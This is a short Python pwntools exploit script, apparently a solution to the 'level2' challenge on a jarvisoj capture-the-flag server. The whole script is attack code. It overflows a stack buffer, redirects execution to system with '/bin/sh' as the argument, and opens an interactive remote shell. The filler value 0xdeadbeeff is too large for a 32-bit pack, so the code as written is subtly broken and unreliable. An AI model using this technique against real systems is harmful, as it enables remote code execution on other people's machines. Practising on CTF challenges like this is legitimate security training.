#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

io = remote("pwn2.jarvisoj.com",9878)
elf = ELF("./level2")

sys_addr = elf.symbols["system"]
bin_addr = elf.search("/bin/sh").next()

payload = 'a'*(0x88 + 0x4)
payload += p32(sys_addr)
payload += p32(0xdeadbeeff)
payload += p32(bin_addr)

io.recvline()
io.sendline(payload)
io.interactive()
io.close()
